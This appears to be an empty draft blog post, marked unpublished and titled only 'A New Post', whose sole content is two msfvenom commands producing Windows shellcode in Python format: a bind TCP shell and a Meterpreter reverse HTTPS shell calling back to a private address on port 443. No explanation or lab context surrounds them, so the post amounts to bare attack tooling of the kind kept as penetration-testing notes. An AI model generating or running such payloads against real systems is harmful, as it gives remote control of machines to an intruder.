---
published: false
---

## A New Post

    msfvenom -p windows/shell/bind_tcp -b '\x00' -f python -a x86
    
    msfvenom -p windows/meterpreter/reverse_https lport=443 lhost=192.168.30.36 -b '\x00' -f python -a x86



